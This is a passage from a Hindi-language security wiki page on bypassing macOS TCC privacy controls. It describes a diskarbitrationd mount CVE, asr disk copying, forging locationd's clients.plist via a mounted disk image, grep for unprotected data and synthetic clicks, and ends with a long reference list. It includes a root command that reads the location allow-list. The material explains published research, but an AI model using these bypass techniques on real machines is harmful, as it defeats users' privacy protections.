[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) में बताया गया है कि इस CVE ने `diskarbitrationd` का दुरुपयोग किया था।<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework का `DADiskMountWithArgumentsCommon` function security checks करता था। हालांकि, `diskarbitrationd` को सीधे call करके इसे bypass करना और इस तरह path में `../` elements तथा symlinks का इस्तेमाल करना संभव था।

इससे attacker किसी भी location पर arbitrary mounts कर सकता था, जिसमें TCC database पर mount करना भी शामिल था। इसकी वजह `diskarbitrationd` का entitlement `com.apple.private.security.storage-exempt.heritable` था।

### asr

Tool **`/usr/sbin/asr`** पूरी disk को copy करके किसी दूसरी जगह mount कर सकता था, जिससे TCC protections bypass हो जाती थीं।

### CVE-2022-22655 - Location Services

Location Services, अन्य services की तरह TCC database में **store नहीं** होती हैं। इन्हें `locationd` manage करता है, जो अपनी allow-list **`/var/db/locationd/clients.plist`** में रखता है:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Each entry की key client (bundle ID या executable path) होती है और इसमें `Authorized`, `BundleId`, `Executable` और `Registered` जैसे fields होते हैं।<sup>[[4]](#references)</sup>

`clients.plist` file खुद Sandbox/TCC से protected है और इसे root के रूप में भी edit नहीं किया जा सकता — लेकिन **`/var/db/locationd/` directory mounting से protected नहीं थी**। इसलिए root के रूप में चल रहा attacker अपनी `clients.plist` वाली disk image बना सकता था (जिसमें उसका binary `Authorized` के रूप में marked हो), उसे directory पर mount कर सकता था और forged allow-list को लागू करने के लिए `locationd` को restart कर सकता था।<sup>[[3]](#references)</sup>

> [!TIP]
> यह ऊपर बताए गए `hdiutil`/`mount` TCC bypasses जैसा ही pattern है: *file* protected है, लेकिन जिस *directory* में वह रहती है, वह नहीं। इसलिए file के बजाय पूरी directory को replace किया जाता है।

## Startup apps से


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep से

कई मामलों में files संवेदनशील जानकारी, जैसे emails, phone numbers, messages... को ऐसी जगहों पर store करती हैं जो protected नहीं हैं (Apple के अनुसार यह vulnerability मानी जाती है)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

अब यह काम नहीं करता, लेकिन [**पहले करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करके एक और तरीका:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework को bypass करना](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [संयोग से और जानबूझकर macOS TCC User Privacy Protections को bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (मूल रिपोर्ट)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [दुनिया में Carmen Sandiego कहाँ है: macOS पर Location Services का दुरुपयोग](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass से iCloud का data चुराना](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD environment variables entitlement को allow करना](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware में Zero-Day TCC bypass का पता चला](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "आपके Mac पर जो होता है, क्या वह Apple के iCloud में रहता है?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [macOS की नई vulnerability, "powerdir," से user data तक unauthorized access हो सकता है](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory बदलकर TCC bypass करना, यानी CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Music चलाकर TCC bypass करना, यानी CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [एक (Fire)fox को कैसे लूटें](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS में Telegram के जरिए TCC bypass करना](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Vulnerabilities का खुलासा: diskarbitrationd और storagekitd Audit, भाग 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks और CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X पर environment variables set करना](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass और privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC database पर mount करके TCC bypass करना](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS Privacy Mechanisms को bypass करने के 20+ तरीके](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC के खिलाफ Knockout जीत - MacOS Privacy Mechanisms को bypass करने के 20+ नए तरीके](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Spotlight से Apple Intelligence तक — macOS AI को चलाने वाला data चुराने के लिए 0day का दुरुपयोग](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
